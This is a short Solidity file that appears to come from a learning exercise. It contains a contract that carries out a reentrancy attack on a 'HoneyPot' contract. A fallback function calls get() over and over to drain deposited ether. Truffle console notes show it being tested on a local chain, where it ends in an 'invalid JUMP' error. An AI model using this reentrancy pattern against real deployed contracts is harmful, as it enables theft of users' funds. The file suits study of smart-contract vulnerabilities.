pragma solidity ^0.4.8;

import "./HoneyPot.sol";

contract HoneyPotCollect {
  HoneyPot public honeypot;

  function collect() payable {
    honeypot.put.value(msg.value)();
    honeypot.get();
  }

  function () payable {
    honeypot.get();
  }
}


/*
truffle console commands

get HoneyPot contract address
HoneyPot.deployed().then(instance => instAddress = instance.address)

check its balance
web3.eth.getBalance(instAddress).toString(10)
 '0'

add 5 ether to it
HoneyPot.deployed().then(instance => instance.put({from: web3.eth.accounts[1], value: web3.toWei(5, "ether") }))

check that the ether is there
web3.eth.getBalance(instAddress).toString(10)
 '5'


collect the ether
HoneyPotCollect.deployed().then(inst => inst.collect.sendTransaction({value: web3.toWei(5, "ether")}))

 Error: VM Exception while processing transaction: invalid JUMP at 4029734eb96faa1466ae3baa643b10db844f537a75ad0f1479a8e5d41fdae774/11736ee437fe8c3ebba93ab7e63a640f2619bba4:176
    at Object.InvalidResponse (/usr/lib/node_modules/truffle/node_modules/web3/lib/web3/errors.js:35:16)

    ??????

*/
